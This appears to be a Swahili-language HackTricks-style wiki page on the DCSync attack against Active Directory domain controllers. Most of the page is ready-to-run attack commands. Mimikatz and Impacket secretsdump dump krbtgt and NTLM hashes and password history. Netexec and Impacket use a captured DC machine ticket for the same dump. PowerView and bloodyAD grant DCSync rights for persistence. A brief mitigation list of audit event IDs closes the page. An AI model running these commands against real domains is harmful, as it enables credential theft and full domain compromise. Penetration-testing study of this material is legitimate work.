# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Ruhusa ya **DCSync** inamaanisha kuwa na ruhusa hizi juu ya domain yenyewe: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** na **Replicating Directory Changes In Filtered Set**.

**Maelezo Muhimu kuhusu DCSync:**

- Shambulio la **DCSync** linaiga tabia ya Domain Controller na kuwaomba Domain Controller wengine warudie maelezo** kwa kutumia Directory Replication Service Remote Protocol (MS-DRSR). Kwa kuwa MS-DRSR ni kazi halali na ya lazima ya Active Directory, haiwezi kuzimwa au kulemazwa.
- Kwa chaguo-msingi ni vikundi vya **Domain Admins, Enterprise Admins, Administrators, na Domain Controllers** pekee vilivyo na priviliji zinazohitajika.
- Kwa vitendo, **full DCSync** inahitaji **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** kwenye domain naming context. **`DS-Replication-Get-Changes-In-Filtered-Set`** mara nyingi hupewa pamoja navyo, lakini ikitumika pekee yake ni muhimu zaidi kwa kusynchroniza **confidential / RODC-filtered attributes** (kwa mfano siri za zamani za mtindo wa LAPS) kuliko kwa full krbtgt dump.
- Ikiwa nenosiri lolote la akaunti limehifadhiwa kwa reversible encryption, chaguo linapatikana katika Mimikatz la kurudisha nenosiri kwa clear text

### Enumeration

Angalia ni nani aliye na ruhusa hizi kwa kutumia `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Ikiwa unataka kuzingatia **non-default principals** zenye haki za DCSync, chuja nje vikundi vya built-in vinavyoweza replication na kagua tu trustees zisizotarajiwa:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Tumia Exploit Kienyeji
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Tumia kwa Mbali
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Mifano ya vitendo zenye upeo:
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync kwa kutumia TGT ya mashine ya DC iliyokamatwa (ccache)

Katika hali za export-mode za unconstrained-delegation, unaweza kunasa Domain Controller machine TGT (mfano, `DC1$@DOMAIN` kwa `krbtgt@DOMAIN`). Kisha unaweza kutumia hiyo ccache kujithibitisha kama DC na kufanya DCSync bila nenosiri.
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Noti za uendeshaji:

- **Njia ya Kerberos ya Impacket hugusa SMB kwanza** kabla ya simu ya DRSUAPI. Ikiwa mazingira yanatekeleza **SPN target name validation**, dump kamili inaweza kushindwa kwa `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Katika hali hiyo, ama omba **`cifs/<dc>`** service ticket kwa DC lengwa kwanza au rudi kwenye **`-just-dc-user`** kwa akaunti unayohitaji mara moja.
- Unapokuwa na lower replication rights pekee, LDAP/DirSync-style syncing bado inaweza kufichua atributi za **confidential** au **RODC-filtered** (kwa mfano legacy `ms-Mcs-AdmPwd`) bila full krbtgt replication.

`-just-dc` hutengeneza faili 3:

- moja yenye **NTLM hashes**
- moja yenye **Kerberos keys**
- moja yenye cleartext passwords kutoka NTDS kwa akaunti zozote zilizo na [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) imewezeshwa. Unaweza kupata users wenye reversible encryption kwa

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistence

Ikiwa wewe ni domain admin, unaweza kutoa permissions hizi kwa user yeyote kwa msaada wa `powerview`:
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Waendeshaji wa Linux wanaweza kufanya vivyo hivyo kwa `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Kisha, unaweza **kuangalia kama mtumiaji alipewa kwa usahihi** zile 3 privileges kwa kuzitafuta kwenye output ya (unapaswa kuona majina ya privileges ndani ya uwanja wa "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigation

- Security Event ID 4662 (Audit Policy for object must be enabled) – Operesheni ilifanywa kwenye object
- Security Event ID 5136 (Audit Policy for object must be enabled) – directory service object ilibadilishwa
- Security Event ID 4670 (Audit Policy for object must be enabled) – Ruhusa kwenye object zilibadilishwa
- AD ACL Scanner - Tengeneza na linganisha ripoti za ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [https://github.com/fortra/impacket/blob/master/ChangeLog.md](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [https://simondotsh.com/infosec/2022/07/11/dirsync.html](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)
- HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA: https://0xdf.gitlab.io/2025/09/12/htb-delegate.html

{{#include ../../banners/hacktricks-training.md}}
